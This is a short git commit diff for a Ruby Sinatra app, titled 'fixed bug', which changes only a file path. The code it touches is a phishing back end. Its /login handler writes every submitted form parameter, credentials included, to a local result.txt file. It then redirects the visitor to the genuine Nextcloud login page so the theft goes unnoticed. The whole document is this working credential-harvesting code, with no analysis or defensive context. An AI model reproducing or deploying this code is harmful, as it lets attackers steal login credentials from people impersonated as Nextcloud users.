5138b3522e631db280242665598df11e5f17522c
Yates <yates0x00@sina.com>
2023-04-25 10:44:30 +0000

    fixed bug

--- app.rb
+++ app.rb
@@ -1,6 +1,6 @@
 require 'sinatra'
 post '/login' do
-  open('result.txt', 'a') do |f|
+  open('./result.txt', 'a') do |f|
     f << "== #{Time.now}, params:#{params.inspect} \r\n"
   end
   redirect "https://projects.nextcloud.com/login"
